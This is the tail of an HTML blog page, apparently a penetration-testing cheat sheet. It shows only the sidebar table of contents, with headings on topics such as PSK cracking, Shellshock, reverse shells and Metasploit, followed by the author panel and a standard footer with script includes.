nav-level-5"><a class="nav-link" href="#Step-2-%E4%BD%BF%E7%94%A8IKEForce%E6%9E%9A%E4%B8%BE%E7%BB%84%E5%90%8D"><span class="nav-number">1.9.6.2.2.</span> <span class="nav-text">Step 2:使用IKEForce枚举组名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Step-3-%E4%BD%BF%E7%94%A8ike-scan%E6%8A%93%E5%8F%96PSK%E5%93%88%E5%B8%8C"><span class="nav-number">1.9.6.2.3.</span> <span class="nav-text">Step 3: 使用ike-scan抓取PSK哈希</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Step-4-%E4%BD%BF%E7%94%A8psk-crack-%E7%A0%B4%E8%A7%A3PSK-%E5%93%88%E5%B8%8C"><span class="nav-number">1.9.6.2.4.</span> <span class="nav-text">Step 4: 使用psk-crack 破解PSK 哈希</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PPTP-Hacking"><span class="nav-number">1.9.6.3.</span> <span class="nav-text">PPTP Hacking</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#NMAP-PPTP-%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="nav-number">1.9.6.3.1.</span> <span class="nav-text">NMAP PPTP 指纹识别:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PPTP%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB"><span class="nav-number">1.9.6.3.2.</span> <span class="nav-text">PPTP字典攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS-%E9%9A%A7%E9%81%93"><span class="nav-number">1.9.7.</span> <span class="nav-text">DNS 隧道</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%9C%BA%E5%99%A8%EF%BC%9A"><span class="nav-number">1.9.7.1.</span> <span class="nav-text">攻击机器：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BOF-Exploit"><span class="nav-number">1.10.</span> <span class="nav-text">BOF &#x2F; Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-%E6%90%9C%E7%B4%A2"><span class="nav-number">1.11.</span> <span class="nav-text">Exploit 搜索</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2EXP"><span class="nav-number">1.11.1.</span> <span class="nav-text">搜索EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8Kali%E4%B8%8A%E7%BC%96%E8%AF%91WIndows%E7%9A%84exp"><span class="nav-number">1.11.2.</span> <span class="nav-text">在Kali上编译WIndows的exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91Exploits"><span class="nav-number">1.11.3.</span> <span class="nav-text">交叉编译Exploits</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.11.4.</span> <span class="nav-text">利用通用漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Shellshock%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.11.4.1.</span> <span class="nav-text">利用Shellshock漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#cat-file-%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="nav-number">1.11.4.1.1.</span> <span class="nav-text">cat file (查看文件内容)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Shell-Shock-%E8%BF%90%E8%A1%8Cbind-shell"><span class="nav-number">1.11.4.1.2.</span> <span class="nav-text">Shell Shock 运行bind shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Shell-Shock-%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.11.4.1.3.</span> <span class="nav-text">Shell Shock 反弹shell</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AC%E5%9C%B0Web%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">1.12.</span> <span class="nav-text">简单的本地Web服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%82%E8%BD%BD%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB"><span class="nav-number">1.13.</span> <span class="nav-text">挂载文件共享</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-HTTPS-Web%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.14.</span> <span class="nav-text">HTTP &#x2F; HTTPS Web服务枚举</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%8C%85%E4%BE%A6%E6%B5%8B"><span class="nav-number">1.15.</span> <span class="nav-text">数据包侦测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.16.</span> <span class="nav-text">用户名枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.16.1.</span> <span class="nav-text">SMB 用户枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SNMP-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.16.2.</span> <span class="nav-text">SNMP 用户枚举</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%86%E7%A0%81"><span class="nav-number">1.17.</span> <span class="nav-text">密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E5%85%B8"><span class="nav-number">1.17.1.</span> <span class="nav-text">字典</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E6%9C%8D%E5%8A%A1"><span class="nav-number">1.18.</span> <span class="nav-text">爆破服务</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Hydra-%E7%88%86%E7%A0%B4FTP"><span class="nav-number">1.18.1.</span> <span class="nav-text">使用Hydra 爆破FTP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Hydra-%E7%88%86%E7%A0%B4POP3"><span class="nav-number">1.18.2.</span> <span class="nav-text">使用Hydra 爆破POP3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Hydra-%E7%88%86%E7%A0%B4SMTP"><span class="nav-number">1.18.3.</span> <span class="nav-text">使用Hydra 爆破SMTP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="nav-number">1.19.</span> <span class="nav-text">密码破解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#John-The-Ripper-JTR"><span class="nav-number">1.19.1.</span> <span class="nav-text">John The Ripper - JTR</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%91%BD%E4%BB%A4"><span class="nav-number">1.20.</span> <span class="nav-text">Windows 渗透测试命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%91%BD%E4%BB%A4"><span class="nav-number">1.21.</span> <span class="nav-text">Linux 渗透测试命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E8%AF%91EXP"><span class="nav-number">1.22.</span> <span class="nav-text">编译EXP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%ADC%E4%BB%A3%E7%A0%81%E9%80%82%E7%94%A8%E4%BA%8EWindows%E5%B9%B3%E5%8F%B0%E8%BF%98%E6%98%AFLinux"><span class="nav-number">1.22.1.</span> <span class="nav-text">判断C代码适用于Windows平台还是Linux</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8GCC%E7%BC%96%E8%AF%91Exploit"><span class="nav-number">1.22.2.</span> <span class="nav-text">使用GCC编译Exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A864%E4%BD%8D%E7%9A%84Kali%E4%B8%8A%E7%94%A8GCC%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%9A%84EXP"><span class="nav-number">1.22.3.</span> <span class="nav-text">在64位的Kali上用GCC编译32位的EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8-Linux%E4%B8%8A%E7%BC%96%E8%AF%91%E5%8F%AF%E8%BF%90%E8%A1%8C%E4%BA%8EWindows%E7%9A%84exe%E6%96%87%E4%BB%B6"><span class="nav-number">1.22.4.</span> <span class="nav-text">在 Linux上编译可运行于Windows的exe文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUID-%E4%BA%8C%E8%BF%9B%E5%88%B6"><span class="nav-number">1.23.</span> <span class="nav-text">SUID 二进制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C-bin-bash%E7%9A%84SUID-C-Shell"><span class="nav-number">1.23.1.</span> <span class="nav-text">运行 &#x2F;bin&#x2F;bash的SUID C Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C-bin-sh%E7%9A%84SUID-C-Shell"><span class="nav-number">1.23.2.</span> <span class="nav-text">运行 &#x2F;bin&#x2F;sh的SUID C Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E5%BB%BA-SUID-Shell-%E4%BA%8C%E8%BF%9B%E5%88%B6"><span class="nav-number">1.23.3.</span> <span class="nav-text">构建 SUID Shell 二进制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%90%91Shells"><span class="nav-number">1.24.</span> <span class="nav-text">反向Shells</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TTY-Shells"><span class="nav-number">1.25.</span> <span class="nav-text">TTY Shells</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8Python%E6%A8%A1%E6%8B%9F-TTY-Shell%E7%9A%84%E6%8A%80%E5%B7%A7"><span class="nav-number">1.25.1.</span> <span class="nav-text">用Python模拟 TTY Shell的技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8sh%E6%A8%A1%E6%8B%9F%E4%BA%A4%E4%BA%92%E5%BC%8Fshell"><span class="nav-number">1.25.2.</span> <span class="nav-text">用sh模拟交互式shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8Perl%E6%A8%A1%E6%8B%9F-TTY-Shell"><span class="nav-number">1.25.3.</span> <span class="nav-text">用Perl模拟 TTY Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8Ruby%E6%A8%A1%E6%8B%9F-TTY-Shell"><span class="nav-number">1.25.4.</span> <span class="nav-text">用Ruby模拟 TTY Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8Lua-%E6%A8%A1%E6%8B%9FTTY-Shell"><span class="nav-number">1.25.5.</span> <span class="nav-text">用Lua 模拟TTY Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8EVi%E6%A8%A1%E6%8B%9FTTY-Shell"><span class="nav-number">1.25.6.</span> <span class="nav-text">从Vi模拟TTY Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8NMAP%E6%A8%A1%E6%8B%9FTTY-Shell"><span class="nav-number">1.25.7.</span> <span class="nav-text">用NMAP模拟TTY Shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Metasploit-%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="nav-number">1.26.</span> <span class="nav-text">Metasploit 速查表</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Meterpreter-Payloads"><span class="nav-number">1.26.1.</span> <span class="nav-text">Meterpreter Payloads</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-%E5%8F%8D%E5%90%91meterpreter-payload"><span class="nav-number">1.26.2.</span> <span class="nav-text">Windows 反向meterpreter payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-VNC-Meterpreter-payload"><span class="nav-number">1.26.3.</span> <span class="nav-text">Windows VNC Meterpreter payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-%E5%8F%8D%E5%90%91Meterpreter-payload"><span class="nav-number">1.26.4.</span> <span class="nav-text">Linux 反向Meterpreter payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Meterpreter%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="nav-number">1.27.</span> <span class="nav-text">Meterpreter速查表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8Metasploit-%E6%A8%A1%E5%9D%97"><span class="nav-number">1.28.</span> <span class="nav-text">常用Metasploit 模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8BWindows-Metasploit-%E6%A8%A1%E5%9D%97-exploits"><span class="nav-number">1.28.1.</span> <span class="nav-text">远程Windows Metasploit 模块(exploits)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0Windows-Metasploit-%E6%A8%A1%E5%9D%97-exploits"><span class="nav-number">1.28.2.</span> <span class="nav-text">本地Windows Metasploit 模块(exploits)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BE%85%E5%8A%A9Metasploit-%E6%A8%A1%E5%9D%97"><span class="nav-number">1.28.3.</span> <span class="nav-text">辅助Metasploit 模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Metasploit-Powershell-%E6%A8%A1%E5%9D%97"><span class="nav-number">1.28.4.</span> <span class="nav-text">Metasploit Powershell 模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-%E5%90%8E%E6%B8%97%E9%80%8FMetasploit-%E6%A8%A1%E5%9D%97"><span class="nav-number">1.28.5.</span> <span class="nav-text">Windows 后渗透Metasploit 模块</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ASCII%E8%A1%A8%E9%80%9F%E6%9F%A5"><span class="nav-number">1.29.</span> <span class="nav-text">ASCII表速查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCO-IOS-%E7%BD%91%E9%99%85%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%91%BD%E4%BB%A4"><span class="nav-number">1.30.</span> <span class="nav-text">CISCO IOS(网际操作系统) 命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E5%AD%A6"><span class="nav-number">1.31.</span> <span class="nav-text">密码学</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6"><span class="nav-number">1.31.1.</span> <span class="nav-text">哈希长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%93%88%E5%B8%8C%E4%BE%8B%E5%AD%90"><span class="nav-number">1.31.2.</span> <span class="nav-text">哈希例子</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLMap%E4%BE%8B%E5%AD%90"><span class="nav-number">1.32.</span> <span class="nav-text">SQLMap例子</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="findneo"
+      src="/images/findneo.png">
+  <p class="site-author-name" itemprop="name">findneo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">79</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/findneo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;findneo" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/findneo_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;findneo_" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findneo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
